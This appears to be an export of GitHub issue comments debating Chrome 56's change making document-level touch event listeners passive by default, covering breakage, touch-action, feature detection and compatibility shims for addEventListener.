""Fast by default"" is a great policy, and one that should guide future API design and implemetation of web features. However, I don't think improving scroll jank should cost us breakage on drag and drop across the mobile web.

Finally, I want to question some of the ""support"" for this change that has been touted:

* [""Given the huge positive response that video has gotten from users, we're willing to accept a little bit of hacks / compat pain here""](https://github.com/WICG/interventions/issues/18#issuecomment-250315841) - The video in question as 14k views and 36 ""thumbs up"". I really, really hope this isn't being used to make a decision about whether this intervention is appropriate.
* [""I'm actually shocked that I can't find a single complaint on Twitter about this, in contrast to some other interventions which have still been judged to be worth the cost overall.""](https://github.com/WICG/interventions/issues/18#issuecomment-279163417) - The Twitter search in question is for ""chrome 56 android scrolling"", and I hardly think someone trying to resize an image in Gmail is tweeting that. This doesn't seem like a great signal either.
* It looks like there was a good faith effort to get feedback from other browsers, which is great! I don't know all the players so maybe there were on some of the discussions I read. However **I don't believe this change is in the HTML5 spec**, and making such a dramatic change without that kind of agreement, or at least without showing progress, seems unwise. I'd welcome some links to clear up the standards process here.

Thanks for all your work Chrome team. I do hope you reverse your decision here, and that you can find another way to balance vehemence for your performance goals with the greater goals of the platform and your project."
6756	"I lack time to grasp the full scope of this intervention in details. In principle, for breaking existing sites, I am against a global flat-out reversal of spec behavior like this. However, here some quick thoughts for possible compromise or alternative approaches to this:

One relevant question is: In what primary context does this benefit users at large most?

With the CNN site example. My immediate assumption is that the vast improvement with forced passive touch listeners would seems to be mainly relevant to textual `<main>` content or `<article(s)>`. Things in headers, footers or any UI related elements outside such main content seems most likely not to benefit from passive by default, and rather be affected negatively.

If this observation has any merits. Maybe is there a way in which the fast-by-default behavior could only be enabled only inside such identifiable parent nodes, where it makes the most critical difference for users?"
6757	"Has anyone done some profiling of the (bad site's) event code to try to figure out what's actually causing the slowdown problems and looked for consistencies there?

There are two no-change ""fixes"" I can see for the slowdown that site developers can use:
* Add the `passive:true` option manually (which isn't well supported, and prevents you from using `useCapture` on all the unsupported browsers).
* Move the slow code into `requestAnimationFrame`, `setTimeout` or `setImmediate` (really wish more than just IE/Edge supported that - it's very useful even with a polyfill)."
6758	Let's default `var` to `let` next.
6759	"> @Rycochet
> Add the `passive:true` option manually (which isn't well supported, and prevents you from using `useCapture` on all the unsupported browsers).

Not true. There *is* a quite clean way to detect support for event listener options:

```js
var hasListenerOptions = ( function() {
  var result = false;
  window.addEventListener( ""options-test"", null, Object.defineProperty({}, ""capture"", {
    get: function() { result = true }
  }));
  return result;
}());
```

And from there it's a matter of engineering your site's code with an abstraction over `addEventListener` that can switch between using a listener options object, or the plain boolean for capture.

Actually; for browsers that support `addEventListener` it should afaik be possible to write code that supplants the built-in version of the method. So in theory, it *should* be possible to write a globally applied patch to those built-in methods that do not support event listener options objects with an additional layer that, when given an event listener options object, pulls out the value of the `capture` property and passes only that along as a boolean parameter.

Theoretically, that even gives you a drop-in solution, though ofcourse; this comes with its own performance trade-offs again.
      
----

Come to think of it:
I could totally see someone develop a globally applied patch like this to undo the damage this intervention would do. All it would need to do is add an explicit `passive:false` for all browsers that support passive listeners...

If I were a betting man, I'd put my money on that happening and being adopted as a drop-in by both large commercial sites on-the-cheap as well as by plugin-heavy CMSes for convenience , well before any of those would ever even consider integrating and rolling out the proper fixes. And once *that* genie is out of the bottle, it is never, ever going back in.

I myself won't stoop to the level of actually publishing the required code to sabotage this intervention à priori, but I can imagine others in the nay-camp may have less scruples about doing do, if only to underline the futility of this intervention."
6760	"https://gist.github.com/Rycochet/6ac0380841debbb65f78d36711a0dafa (public domain, so don't want to paste the long code including unlicense header in here).

Unfortunately this change got added so will be around for several months at least. I'd rather have safe code out there able to fix it, than everyone having to develop their own workarounds. If I get the time this week I'll wrap a cut down version of this into a Chrome extension for developers and users of un-maintained websites."
6761	"> Measuring the impact of an intervention definitely seems hard. In the Intent to Intervene email there are a few stats, like the fact that 2% of dispatched events are potentially affected. There is lots of discussion about tracking breakage, but no real numbers shared.

Did you look at this [document](https://docs.google.com/document/d/1II7oSIpd8pK91V5kEM3tDLKcIj398jOJn8Niqy6_loI/edit?disco=AAAAAsxZ9FU) that was linked in the intent to intervene? What more details can I provide? I checked the stats and they are stable with 2% of page visits on Android still preventDefault with no touch-action.

> Kendo UI, at least the version on their demo pages. demo

This isn't actually broken since the event listener is on the target (a div). What you are seeing in your video is the fact that devtools sometimes causes weird scenarios when touch is enabled without refreshing the page.  If you refresh the page once enabling emulation mode you should see it works fine. If you are reproducing specific touch issues I recommend using a physical touch device as there are some weird side effects due to emulation.

> There are a number of ways these issues would be addressed:
More evangelizing.
Warnings in the console (without breaking changes).
Warnings in devtools (as Chrome shows w/ forced layout)
Contributing to libraries, adapting them to the new APIs

All of these things we have tried since June last year. What is the recommended channels we should use to reach you? What evangelizing would you have liked to see that we didn't do to get your attention before this breakage? Have you tried [Lighthouse](https://developers.google.com/web/tools/lighthouse/).  I think one problem is that if there is no developer how does a site know something else might be breaking. For document.write there is a proposal to send a [HTTP header](https://github.com/WICG/interventions/issues/17#issuecomment-238477265) so the server can track issues but again this requires someone actively monitoring logs.

> touch-action: none isn't sufficient
I should re-iterate that using touch-action is preferred as it declaratively indicates what sections of the page don't want scrolling to happen on. Since this can be done entirely on the compositor thread we know that not to do scrolling when someone interacts with one of those regions. Adding ""passive: false"" causes us to think the whole document is slow and can be subject to the touch-ack timeout and/or main thread responsiveness interventions. 

We are trying to make the touch events much easier to reason about. Specifically the touch-ack timeout but doing things base on time on devices varies a lot. The top end of Android phones can be an order of magnitude faster that the shipping phones at the low end. "
6762	"I've created an npm package, [`normify-listeners`](https://github.com/maxkfranz/normify-listeners), to fix the breaking API change in Chrome 56.

There's also a higher-level package, [`normify`](https://github.com/maxkfranz/normify), that can be used to pull in multiple packages.  The idea is that if other issues come up in future in whatever browsers, then individual packages can be built around those specific issues.  A dev can just call `normify()` to get all the fixes.

The package fixes the browser forcing `passive: true` by default, and it is flexible enough to work in future if more events are made passive by default in Chrome (e.g. `wheel`).  It also makes it so you can use the `options` object with `capture` and `passive` in old browsers that don't support `options`.  Old browsers will effectively ignore `passive`.  This means you don't have to test for `options` support in all your code and the libs you use.

Of course I would prefer that Chrome followed [the W3C spec for `passive: false` as the default](https://dom.spec.whatwg.org/#event-flatten-more), but workaround packages seem to be the only pragmatic alternative left to devs like myself.

I hope that packages like this one don't help to create the precedent that browser vendors can unilaterally break with standards with the expectation that devs will create workarounds.  Browsers seemed to be really moving forwards by following standards better (*even* Microsoft's browser), but this change really feels like a step backwards."
6763	"@Rycochet 
> Unfortunately I can't personally provide URLs to any sites that I've developed hitting on this as they're education sites for Collins, Hodder and a couple of other smaller publishers (fortunately Pearson didn't need anything like this) - and all the content is under NDA and/or behind school portals that need access through their own sites directly. Currently that stands at ~10k individual sites (ie, not using shared JS/CSS files that can be easily fixed in one place).

How do you have this interoperable on IE and Edge since they don't send touch events on desktop. If you have support for PointerEvents then perhaps your user-agent check for pointer events is a little incomplete? We have long pondered if we really should follow the same model Microsoft does with only supporting touch events on the mobile platform and not the desktop platform."
6764	"> If this observation has any merits. Maybe is there a way in which the fast-by-default behavior could only be enabled only inside such identifiable parent nodes, where it makes the most critical difference for users?

This is precisely what we've tried in this intervention. It currently limits listeners bound to the document, window and body to change the default passive behaviour."
6765	"> This is precisely what we've tried in this intervention. It currently limits listeners bound to the document, window and body to change the default passive behaviour.

@dtapuska, is there any other way to limit this further? That is check the body of the listener function to see if it either returns false, calls preventDefault on the event argument, or passes the event argument to another function?"
6766	"@dtapuska Effectively a single delegated method called for both mouse and touch events. The first line effectively checks which type it is and gets the correct coordinates, then it calls preventDefault to stop the event from getting passed on (to ""click"", or ""mouse*"" if it's touch) as it does all the handling internally. There is absolutely no need to check for pointer-events if I'm treating everything the same (and the UI need to behave identically on both touch and mouse if you're targeting children aged 4+). This bug just means that the handlers will get called twice, breaking everything that expects it to be called once and cancelled, and using 2x the CPU (just glad that I don't write laggy code to begin with).

Interestingly this also means that any site that delegates against anchor clicks (ie, lightbox modal style) will no longer be able to stop the links from opening - meaning until they've patched to stop it, navigation is slower."
6767	@Rycochet have you tried adding a touchend handler? Cancelling the touchend handler prevents the click event from being generated from touch.
6768	"@dtapuska ...So totally ignoring my first paragraph then I guess. Just checking what you're asking: ""Why didn't you add something that's not needed as per the standards to prevent something that was already prevented by following the standards?""."
6769	"@mikesherov  

> is there any other way to limit this further? That is check the body of the listener function to see if it either returns false, calls preventDefault on the event argument, or passes the event argument to another function?

Unfortunately static analysis of javascript is impossible because of eval. ie. you can't compile code and say does anyone in this code path ever access a prototype's preventDefault method. That would be really powerful but unfortunately you can't because you can eval a dynamic string at any time. That being said we also debated whether you let the function run once (as normal) and then see the result for the next time. The problem with that is that it makes even the first interaction slow and is also subject to the touch ack timeout (which is something a lot of web developers aren't familiar with and is really hard to reason about). We really want to get content articulated correctly (with touch-action) because then we don't have to rely on these interventions to try to do the right thing for the user."
6770	"@Rycochet 

> Why didn't you add something that's not needed as per the standards to prevent something that was already prevented by following the standards?

The guidance in the standard is to use touchend. I believe [example 5](https://w3c.github.io/touch-events/#mouse-events) matches the use case you are describing. Yes I do feel for your pain here because earlier in the text it does say that touchstart, touchmove can be prevented and don't allow clicks. One idea as well in this area was to have a half baked preventDefault that basically didn't prevent scrolling but did prevent the compatability events. This felt like another wort and we wanted to make the event as standard as possible since it is non-cancelable preventDefault does nothing and content would have to move to preventing clicks via the touchend.  

You didn't answer whether your app works correctly on IE and Edge desktop."
6771	"`eval()` is evil, and sadly - checking through once to see if it's called won't mean that being called again doesn't cause it to be called (due to anything really, from scroll position to element under the pointer etc) - so the only static analysis that might work is ""No code on this page uses `eval` at all"" (or any of the various ways to get the same effect) :-/

> If touchstart, touchmove, or touchend are canceled, the user agent should not dispatch any mouse event that would be a consequential result of the prevented touch event.

> If, however, either the touchstart, touchmove or touchend event has been canceled during this interaction, no mouse or click events will be fired, and the resulting sequence of events would simply be:

Hence - single handler, preventDefault so it's not called on the ""fake"" mouse events after the real click events, or is called on the real mouse events. Example 5 is simply one example showing a way to prevent it. You can also cancel the click event directly on a click handler - however the click delay on touch devices means a lot of sites in general sit on the touchend / mouseup events simply to prevent that delay (and rely on cancelling that for preventing the click event).

There is no guidance to cancel any specific event, all touch* events are acceptable as repeated twice on the specs. The only guidance in those examples is not to have two code paths if the browser can handle touch at all.

All 10k+ pages used common code that was tested in everything from IE8 and up (plus LTS Firefox, and even Safari on Windows) due to client requirements..."
6772	"Perfect is the enemy of the good here, no?

You can check the direct handler, not even all code paths, to see if it uses eval, returns, or passes the event along. If it didn't use eval directly nor returned directly, nor passed the event along to another function, wouldn't you be guaranteed that it's not going to preventDefault?"
6773	"To clarify, the following seems to be true unless I'm missing something:

```
// certainly won't cancel
body.addEventListener('touchstart', () => {
  doSomething();
});
```

```
// may cancel because doSomething may return false
body.addEventListener('touchstart', () => {
  return doSomething();
});
```

```
// may cancel because doSomething may preventDefault on e
body.addEventListener('touchstart', (e) => {
  doSomething(e);
});
```

```
// may cancel because eval could be anything
body.addEventListener('touchstart', (e) => {
  eval(someString);
});
```"
6774	What if doSomething called window.event.preventDefault() in your first example?
6775	"@mikesherov Sadly it's an ""almost"" - you could check for a literal `""preventDefault""` in the source, but nothing stopping the coder from doing `event[""prevent"" + ""Default""]()`. Unless you're going to do static analysis on every possible branch in the code you're not going to know where it's been used - and some of the code branches might be deliberately (or accidentally) unreachable - causing false-positives... I can't see there being any way for them to figure it out from code use."
6776	"@Rycochet @dtapuska `window.event` and magic `event` are non-standard: https://developer.mozilla.org/en-US/docs/Web/API/Window/event and don't work in FF. So in my first case, you're breaking something that is already 100% broken in Firefox.

"
6777	@mikesherov Don't look at me there - among other things I use Typescript whenever I can on top of actually reading the MDN pages and specs ;-)
6778	"@Rycochet @dtapuska @RByers to be clear:

```
body.addEventListener('touchstart', () => {
  doSomething();
});
```

will not `preventDefault()` the event unless it's relying on non-standard magic `event` or `window.event` that is already broken in FF."
6779	"@mikesherov If there is no argument to the function, then you also need to check that `arguments` is not used anywhere. You also need to check that nobody is being bad and using the function chain to get hold of `arguments` (yes, it's not a good idea, but still possible). The unfortunate thing with edge cases is that they're still possible - it's why there's so many security advisories because of people thinking ""oh, I can't see that ever happening"". I can say with certainty that I always use `event` as an argument (even when not needed - though UglifyJs takes care of that) - but can't speak for anyone else's code unless I've had a hand in code review etc."
6780	"If broad criteria were used as a heuristic, the detection of `preventDefault()` use would likely not have to be perfect.  It's more important to avoid false negatives than false positives.  As long as the percent of false positives is relatively low in the set of all listener code on all the web, you get the passive performance improvement almost whenever possible and cases that need `preventDefault()` definitely don't break.

For instance:

- `preventDefault` string in the callback or referenced functions => assume the handler calls `event.preventDefault()`
- use of `arguments` in the callback => assume the handler calls `event.preventDefault()`
- use of dynamic function names in the callback or referenced functions => assume the handler calls `event.preventDefault()`

You could probably come up with better criteria, but this gives you a sense of the idea.

I would bet that the false positive rate for broad, relatively simple criteria would be low enough in practice.  This all assumes that the criteria are broad enough for a zero false negative rate."
6781	"> @mikesherov If there is no argument to the function, then you also need to check that arguments is not used anywhere.

@Rycochet still no, arguments would need to be passed downward.

```
// gauranteed not to cancel
body.addEventListener('touchstart', () => {
  doSomething();
});
```

```
// may cancel
body.addEventListener('touchstart', (...args) => {
  doSomething(...args);
});
```

```
// may cancel
body.addEventListener('touchstart', () => {
  doSomething(arguments);
});
```
"
6782	"@mikesherov https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function
> Function.arguments 
> An array corresponding to the arguments passed to a function. This is deprecated as property of Function, use the arguments object available within the function instead.

Pretty sure I saw it being used in a very bad way several years ago - really hope nothing uses it now, but legacy code etc..."
6783	"> and the css touch-action fix is not possible as it's a library, so it would need to use browser-detection for consistent behaviour

@Rycochet, sorry, I don't understand this.  The library has code which is deciding when to call `preventDefault` within events dispatched to some `target`, right?  Why can't that same library have code which does `target.style.touchAction='none'` (or whatever describes the use case)?  Also, even if you DO need to set `passive:false`, you can still use [feature detection](https://github.com/WICG/EventListenerOptions/blob/gh-pages/explainer.md#feature-detection), not browser detection.

> Unfortunately I can't personally provide URLs to any sites that I've developed hitting on this ... I can say that the specific uses for this are for paged displays

Have you verified that they are indeed broken (not just generating a console warning but still behaving OK)?  In most paged-display cases, the page isn't actually scrollable so there's no real harm in practice (except perhaps on ChromeOS which I believe has a default horizontal overscroll action for back/forward).

> my biggest issue with it is inconsistency between browsers

@mawalker that's my personal [top priority](https://www.chromium.org/blink/platform-predictability) as well.  I talked with all the other major implementors of touch events before making this change, and although they didn't all comment publicly (so I'm not going to repeat details of what they told me) I am confident that we'll ultimately get all browser behaving the same and [matching the spec](https://github.com/w3c/touch-events/issues/74).  Otherwise (eg. after 2 years) I will have considered this intervention to have failed and something that we should seriously explore undoing in Chrome.  This is (roughly) how web standards evolve.

> @rbyers, ignoring whether or not it may be performant or difficult to do so, would it be possible to do some type of static analysis (or limited dynamic analysis) when a non-passive touch listener is bound to check if the Event Object is preventDefault'ed or passed to another function, and if so, assume preventDefault will happen?

@mikesherov, we did some experiments with this years ago (we've been fighting this general problem for five years now, so we've tried a LOT).  My conclusion from the research done was that, no, the design of JavaScript and today's frameworks just make such analysis impossible in the general case (i.e. >50% of the cases that occur in practice).  Eg. consider a page with a image carousel at some point on it listening to events via jQuery event delegation.  You really have to step through all the jQuery event delegation code (or bake in some magic knowledge of how jQuery works) to know whether the touchmove is going to land in a handler that's going to call `preventDefault` or not.  We tried a bunch of heuristics, but none of them were at all reliable in predicting whether `preventDefault` would be called.  Even if we found some magic formula, we'd almost certainly never be able to standardize it and get other browsers to implement it since it would be all heuristics and not really rational platform design.

> It has been less than a year since they appeared, and the API still isn't supported by Edge or iOS Safari 

Actually, caniuse is wrong about mobile safari - they were eager to get it into iOS 10.  Submitted a [PR to correct caniuse](https://github.com/Fyrd/caniuse/pull/3179).  

> Warnings in the console (without breaking changes).
> Warnings in devtools (as Chrome shows w/ forced layout)

Chrome has had performance warnings along those lines in devtools (red dog ear) for this sort of problem for years, and very specific console warnings for this ever since passive event listeners shipped:

![image](https://cloud.githubusercontent.com/assets/1280419/23046611/83994732-f478-11e6-8010-face97555ed4.png)

In general we've found they make very little difference (though perf tools in general are still a big area of investment for us, we feel it's critical that motivated developers do have powerful tools to help them improve performance when they're willing to invest to do so).

> Contributing to libraries, adapting them to the new APIs

Yep, we've put a lot of time into this over the past year too.  Sometimes [with success](https://github.com/Parsely/time-engaged/issues/3) but [mostly](https://github.com/emberjs/ember.js/issues/12783) [not](https://github.com/jquery/jquery/issues/2871).  

@mixonic thank you for your [thoughtful and well-reasoned comments](https://github.com/WICG/interventions/issues/18#issuecomment-279194353)!  It's definitely too late to reconsider this decision for Chrome 56 (it was done), but undoing this change in a future version of Chrome is definitely still an option.

> Google Analytics, when dragging segments around. video

Yep, this indeed seems broken when used in combination with pinch-zoom.  I've filed an internal bug (35444264) for the team to suggest adding some `touch-action: none` rules.

> Kendo UI, at least the version on their demo pages. demo

Thanks.  Filed issue [here](http://kendoui-feedback.telerik.com/forums/127393-kendo-ui-feedback/suggestions/18356971-fix-touch-drag-and-drop-on-chrome-56).

> Finally, I want to question some of the ""support"" for this change that has been touted:

This is fair criticism IMHO.  We really don't have more than anecdote (and our metrics) on the ""support"" side, and no precise way to quantify the breakage.  I'd love to have a more quantifiable way to make these sorts of trade offs.  It looks like a [search for the chromestatus string that appears in the console](https://www.google.ca/search?q=5093566007214080&oq=5093566007214080&aqs=chrome..69i57j69i60l3.270j0j4&sourceid=chrome&ie=UTF-8) is a better way to get a sense of where this is causing trouble.  The [results from GitHub issues are certainly sobering](https://github.com/search?q=5093566007214080&ref=searchresults&type=Issues&utf8=%E2%9C%93) - going through them all now.

> However I don't believe this change is in the HTML5 spec, and making such a dramatic change without that kind of agreement, or at least without showing progress, seems unwise. I'd welcome some links to clear up the standards process here.

Actually, the touch events spec is intentionally [hand-wavy on this](https://w3c.github.io/touch-events/#cancelability) because most browsers have long relied on heuristics to decide when to block scrolling on touch events:

> Canceling a touch event can prevent or otherwise interrupt scrolling (which could be happening in parallel with script execution). For maximum scroll performance, a user agent may not wait for each touch event associated with the scroll to be processed to see if it will be canceled. In such cases the user agent should generate touch events whose cancelable property is false, indicating that preventDefault cannot be used to prevent or interrupt scrolling. Otherwise cancelable will be true.

But this isn't really fair - I'm an editor of this spec, and I wrote this wording myself :-).  The standards work here definitely wasn't cut-and-dry, especially since the engineers for the main other browser relevant for this problem (Safari) aren't allowed to talk about touch event behavior publicly or participate in [the standard](https://w3c.github.io/touch-events/).  Standards are definitely very important to us, but the standards process is not as simple as you imply - it's an iterative process with implementations. There was by no means consensus from all the engines that this is the right choice.  But I will say this, if [this spec issue](https://github.com/w3c/touch-events/issues/74) is still open in a year (or Chrome is still doing something here not explicitly described by the spec), then I have personally failed the open web and you should publicly shame me for it.

> Has anyone done some profiling of the (bad site's) event code to try to figure out what's actually causing the slowdown problems and looked for consistencies there?

Yep, we've had dozens of different engineers analyzing the scroll performance of hundreds (if not thousands) of different sites suffering from this problem over the past 5 years ([here's a few examples](https://bugs.chromium.org/p/chromium/issues/detail?id=391005)).  To give you some idea of the scale of investment here on the Chrome team - there are two separate teams ([input-dev](https://www.chromium.org/developers/design-documents/input-dev) and [scheduler-dev](https://groups.google.com/a/chromium.org/forum/#!forum/scheduler-dev)) totally a couple dozen engineers, who have for years used this metric (how responsive is scrolling on Android) as their ##1 measure of progress. In general what we find is that it's almost never the touch handlers that are slow, but that the thread is just busy doing other things - 100s of milliseconds of JS framework initialization, huge DOM operations, etc.  [Here's](https://docs.google.com/presentation/d/1sEdUaOf5yyniGElXuol7w86v2D-62wJQ651520lg4qM/edit#slide=id.gcdb90617c_0_35) one (of many) overview [talks](https://www.youtube.com/watch?v=R_y03oNcFmE) one of our engineers did investigating such real-world performance problems and identifying the specific guidance we should be giving developers to avoid them.  Features like [Intersection Observer](https://github.com/WICG/IntersectionObserver/blob/gh-pages/explainer.md) have come out of such analysis.  So the fundamental conclusion we've come to is that most (but certainly not all) websites are just not built with an architecture that allows the main thread to reasonably drive animations on mobile.  For most websites, all animations should run in parallel to the main thread on the compositor thread.  In such a world, touch event blocking scrolling by default is just a design flaw that needs to eventually be fixed.

> I myself won't stoop to the level of actually publishing the required code to sabotage this intervention à priori, but I can imagine others in the nay-camp may have less scruples about doing do, if only to underline the futility of this intervention.

If people really find using such a global opt-out to be the best solution for their site, that's completely fine with me - I don't consider it ""undermining"" at all.  In fact that's the whole reason I introduced the `passive` option in the first place - to let developers opt-out of what I long thought was likely to become our default (being ""avoidable"" is a core part of our [intervention guidelines](https://github.com/WICG/interventions/blob/master/README.md#intervention-design-guidelines)).  I still expect it'll be rare for developers to opt-out this way when `touch-action` is usually simpler/easier AND provides a performance benefit.  Worst case and much of the web gets janky again due to use of `passive:false` everywhere then clearly we screwed up and will need to explore other options.

>  however the click delay on touch devices means a lot of sites in general sit on the touchend / mouseup events simply to prevent that delay (and rely on cancelling that for preventing the click event).

Note that for over a year, the click delay [has been essentially gone](https://developers.google.com/web/updates/2013/12/300ms-tap-delay-gone-away) from the latest version of all major browsers, and for years before popular libraries like fastlick.js would disable themselves in Chrome/Firefox on mobile pages known not to have a click delay.  Listening to `touchend` universally to avoid the legacy click delay is now pretty much an anti-pattern (as it causes a number of other problems)."
6784	"> Why can't that same library have code which does target.style.touchAction='none' (or whatever describes the use case)?

That's sort of like saying ""JQuery should check if you're adding a touch* event and calling `preventDefault`, and if so then add `touch-action:none`, and if it's using a delegate then the behaviour might change..."" - The question isn't as much ""is it possible to work around this,"" as ""how best to work around this."" Ie, the same reason that this can't check for it ;-)

The library that triggered my google search was FabricJS - which is basically a canvas drawing library - and as it includes drag&drop within the canvas needs to attach listeners to the body when dragging. This means that it's got to change the `touch-action` style on the fly, and also that it needs to cache the original value - and it has no clue whether something else also changes that while it's active and dragging (whether removing it, or adding it) - so the state can go wrong. If there are two libraries needing to do things at the same time then they can potentially interfere with each other if trying to do this (as there's no ""stack"" of css changes that can be undone). Instead it could add a className instead - but you always have to be extra careful not to duplicate them by accident and getting the wrong styles attached (but at least it's not touching the `target.style` attribute) - you just need to add a css file (or inline style element).

> Also, even if you DO need to set passive:false, you can still use feature detection, not browser detection.

Mostly we're talking about how much this has broken existing sites - and if they *need* to run on IE8/9 then feature detection is often a little worrying - working feature detection code was posted earlier in the thread though.

> Have you verified that they are indeed broken (not just generating a console warning but still behaving OK)? In most paged-display cases, the page isn't actually scrollable so there's no real harm in practice (except perhaps on ChromeOS which I believe has a default horizontal overscroll action for back/forward).

Tested and slow / jerky sliding horizontal pages (as the first touch event isn't being cancelled so it's duplicating the call and running on mouse events as well). CPU use has obviously doubled (though that's not a significant amount to begin with).

> Chrome has had performance warnings along those lines in devtools (red dog ear) for this sort of problem for years, and very specific console warnings for this ever since passive event listeners shipped

Those warnings only ever show up for pages that actually took too long - so developers who take the time and effort to do things ""better"" (ie, knowing that something might take a while so it's not on an event etc) never saw them: the downside of warning about problems is that the warning never gets seen when the problem doesn't occur. (Ie, The main thread AJAX warning was useful to me - when I had to do something that would have benefited from doing it the ""wrong"" way I knew not to).

>  In fact that's the whole reason I introduced the passive option in the first place - to let developers opt-out of what I long thought was likely to become our default.

I love the idea of it and if I only had to support browsers that supported it then I'd be making far more use of it - as it is I use a `setImmediate()` polyfill instead ;-)

> Note that for over a year, the click delay has been essentially gone from the latest version of all major browsers.

I (and a great many content creators / contractors) still have to support older browsers - generally that means a latency of at least 3-5 years with a couple of exceptions (I have to support the iPad2, which means iOS9, for at least the next couple of years. I've only recently been able to take the iPad1 / iOS5 off the specs, and finally being able to drop IE10 and below from future projects is such a relief!)."
6785	"> Tested and slow / jerky sliding horizontal pages (as the first touch event isn't being cancelled so it's duplicating the call and running on mouse events as well). CPU use has obviously doubled (though that's not a significant amount to begin with).

Crap, sorry to hear it's actually broken.  But the page doesn't support scrolling, right?  I.e. it's not scrolling the page at the same time as moving your slider?  That shouldn't happen - if you can get me a repro then it's possible there's a Chrome bug we could fix here.  Note there are no mouse events sent during a drag (mouse events are sent only after a tap or long-press, but `pointermove` is sent during a drag).  The jerkyness you're seeing is probably because `touchmove` events in Chrome get throttled to 10hz when there is an active scroll (but that's supposed to be only when something is actually scrolling, once it hits the scroll extent you should get back up to 60hz).  The real problem though should be double handling - moving two things at once (page + widget) for a single gesture.

> Those warnings only ever show up for pages that actually took too long

That's a good point.  Once we knew we were going to do the intervention we should have had another warning saying never to rely on `preventDefault` in this case.  We're generally pretty good about doing that for interventions / removals, I think we just missed it this time.  I'll try to make sure such a mistake doesn't happen again.

> I love the idea of it and if I only had to support browsers that supported it then I'd be making far more use of it - as it is I use a setImmediate() polyfill instead ;-)

You mean you're using setImmediate to get the same benefit of passive listeners?  That won't work.  Almost all of the benefit of passive listeners is not because the handler itself is slow, but because there are other things running on the thread that are slow.  By the time the handler is invoked at all, the damage is done.  Why not just use feature detection to pass `passive:false` when on a browser that supports it?"
6786	I am against this course of action. r56 has broken a lot of my applications. event.preventDefault() gave me a lot of control over touch events in highly interactive applications. 
6787	"@RByers It's a private repo I can't share - plus about 100k-lines of Javascript including a complete IDE - I can email an exported activity so you can see it and share the specific section of code if it would be helpful. Basically it's horizontal scrolling, but only the active ""page"" and the ones to the direct left and right are visible - and it manipulates the `.scrollLeft`. Did just test with a different export - and seems that having an animation running (CreateJS) makes it obvious (and only when in Device mode on desktop - as I don't have an Android device to test on), so that 10hz thing might be related.

I think the warning should have been put in for both mouse* and touch* handlers that took too long - that way developers would have had fair warning, and it would have shown up on desktop devices where there's a console open (I doubt there's much Device testing going on beyond ""does this css look right at this resolution""). Hindsight ;-)

Because I'd need to double lines to support `useCapture` as well as `passive:true`. The only reasons I use `setImmediate` or `requestAnimationFrame` are because either a. I know this will take a while or b. I know this can be triggered more often than I actually need it to run. I started coding properly with asm and then C on the Amiga - so tracking resources and potential bottlenecks is second nature ;-)"
6788	Just wanted to report this broke New Relic as well.
6789	@RByers is there any other way out for this? A lot of web apps are broken due to this intervention. Even google's very own apps (gmail and analytics). I can imagine how many other apps are going to be affected. If you look at iOS, there is no such intervention. But scrolling through web page is definitely way smoother than the experience we have on Android. It's unfair to release such intervention because of the mediocre experience caused by Android. You should probably allow content block/ads blocker on chrome if you really want to bring it to the next level of superior web experience just like what iOS did.
6790	I'm sorry, just saying. Google will probably fire you if you dare to block google ads on chrome.
6791	"> @rickbias 
> is there any other way out for this?

It is possible to globally overwrite the `addEventListener` method and forcibly pass `{ passive : false }` options when the passive flag isn't explicitly specified by the caller. That forces Chrome's behavior back to aligning with spec.

Earlier in this thread, @maxkfranz already linked to the [`normify-listeners`](https://www.npmjs.com/package/normify-listeners) package that handles this, but that only works for site developers, not for users suffering from broken sites. Maybe someone can cook this package into a Chrome extension?


Admittedly; it'd be a lot better if Google would get off their performance-oriented high-horse; admit they screwed the pooch on this one; and at the very least surface a user-reachable opt-out for this intervention."
6792	"Would it also be possible to lazily determine passiveness, @rbyers? 

That is to say, assume passive, record the scroll position at the beginning of every touch event, and if the listener eventually calls preventDefault, restore the scroll position to the correct location, and no longer consider the listener passive?"
6793	@mikesherov That's unlikely to fix many broken sites - as it's the chained event handlers firing that cause breakages rather than simply scrolling issues :-/
6794	"@mikesherov
That would result in _guaranteed_ awkward stutter as opposed to _potential_ jank, wouldn't it?"
6795	"@ryochet I disagree that it won't help, unless you have evidence, we're both conjecturing.

@rjgotten, no. You'd gain passive perf immediately until preventDefault gets called, then you get a *single* frame of stutter followed by no stutter because once the first precentDefault, the listener would no longer be passive. "
6796	FWIW the main frame can run many frames behind the compositor thread which can lead to a jarring user experience if the page jumps around user after some delay to the user. Trying to reset just the scroll position is pretty naive as there may be nested scrollers on the page as well. But largely if all of these cases the code is calling preventDefault consistently it is far better they articulate the page with touch-action. From some of the comments I'm not sure people understand how threaded scrolling works; but the just of it is there is a thread that can respond to input events and move textures around and update the display (only if it knows if there are no touch listeners or they are all passive.) Otherwise it needs to goto the main thread where javascript runs and that is typically a slow thread where events queue up to get run.
6797	"@dtapuska sure. How about just changing the mode from passive to not passive when preventDefault is called the first time.

The situation as it stands is many existing sites are just straight up broken including anyone using fastClick, iScroll, etc.

Certainly *any* mitigation for this intervention is a win. Fine, if it's intractable to attempt to restore nested acrollers, then don't do it. But not reacting to preventDefault at all seems worse than any of the mitigations being discussed here.  "
6798	@mikesherov Around 10k pages I'm responsible for that are affected, ~2% have anything to scroll (which is not being handled by the browser anyway), 100% are using the events to provide UX that is now (visibly) suffering from the problem that this intervention has fixed on badly coded websites.
6799	"@rjgotten 

> It is possible to globally overwrite the addEventListener method and forcibly pass { passive : false } options when the passive flag isn't explicitly specified by the caller. That forces Chrome's behavior back to aligning with spec.

This is exactly what the worst possible outcome the chrome team developers are trying to alleviate. It completely unset the intervention. "
6800	"@dtapuska 

> But largely if all of these cases the code is calling preventDefault consistently it is far better they articulate the page with touch-action.

The touch-action itself is not extensive enough. What if I would like browser to handle scrolling still but still calling preventDefault for certain scenario. Should I completely disable browser's handling of scrolling and implement our own fake inertia scrolling which allow us to keep enabling preventDefault"
6801	"> ~2% have anything to scroll (which is not being handled by the browser anyway), 100% are using the events to provide UX that is now (visibly) suffering from the problem that this intervention has fixed on badly coded websites.

I'm not sure i understand what's being said here. @rycochet, are you saying that 2% are using preventDefault and it's causing the performance issue on those pages?

I suppose what I'm saying is that those authors, by using preventDefault, intended for a certain UX and decided that preventing those events provided the UX they intended. Many sites on the net are broken from this intervention, according to those authors. Many of them were compensating for other missing features of the web platform at the time. To say they are ""badly coded"" is to rewrite history.

Unless you're suggesting using preventDefault is *always* wrong, then we should be discussing ways to mitigate the breakages caused by this intervention. 

